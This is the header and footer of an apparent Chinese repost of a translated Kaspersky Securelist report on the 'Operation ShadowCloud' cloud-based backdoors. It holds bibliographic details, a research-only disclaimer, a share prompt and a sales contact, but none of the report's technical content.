原文标题：Operation ShadowCloud: cloud service–based backdoors targeting government networks in Asia and Africa. Part 2

原文作者：Saurabh Sharma、Noushin Shabab（卡巴斯基 GReAT 团队）

发布时间：2026 年 11 月 17 日

来源：Securelist（卡巴斯基官方安全研究博客）

原文链接：https://securelist.com/operation-shadowcloud-graphdoor/122005/

DISCLAIMER

本文为上述英文原文的中文翻译，仅用于网络安全技术研究与防御交流，不构成任何攻击指导。文中的恶意软件、命令、代码片段与入侵指标均引自公开研究报告，请勿在未获授权的环境中复现或测试。译文力求忠实原文，技术术语、专有名词、哈希与 IP 等指标保持原样；如遇歧义，请以英文原文为准。文中观点与结论归原作者及卡巴斯基 GReAT 团队所有，不代表译者与发布平台立场。

END

如果你觉得这篇有收获，欢迎 **点赞、在看、转发** 三连，我们下篇见。

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/a7509ae51812024c.webp)

更多 卡巴斯基 安全解决方案 详情，请联系：

高进 - 186 6376 1060
![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/61239f7ae74c55dc.jpg)
